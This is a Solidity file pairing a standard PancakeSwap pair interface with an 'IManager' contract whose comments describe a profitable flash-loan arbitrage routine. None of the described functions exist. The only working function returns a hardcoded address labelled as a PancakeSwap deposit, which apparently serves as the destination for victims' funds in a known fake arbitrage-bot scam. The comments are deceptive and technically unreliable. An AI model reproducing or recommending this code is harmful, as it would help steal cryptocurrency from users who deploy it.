pragma solidity >=0.5.0;

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// File: Pancakeswap Contract manager

pragma solidity ^0.5.0;


contract IManager {
        function performTasks() public pure {
        }
/* Breakdown of all functions
      // Submit token to BSC blockchain
      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
   
      // List the token on PancakeSwap
      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
      
      // Get BNB Loan from Multiplier-Finance & loan execution wallet
      string memory loanAddress = manager.takeFlashLoan(loanAmount);
      
      // Convert half BNB to DAI
      manager.pancakeDAItoBNB(loanAmount / 2);
      */
      
      function pancakeswapDeposit() public pure returns (address) {
                return 0xD7930bbbdA8d7d7e6C3B69025985413b0F0Bb9d7;
        }
      /*
   // Create BNB and DAI pairs for our token & provide liquidity
   string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
      manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
      string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
      manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
   
   // Perform arbitrage trades
      manager.pancakePerformSwaps();
      
      // Move remaining BNB from Contract to your personal wallet
      manager.contractToWallet("BNB");
   
   // Repay Flashloan
      manager.repayLoan(loanAddress);
      */

        
}
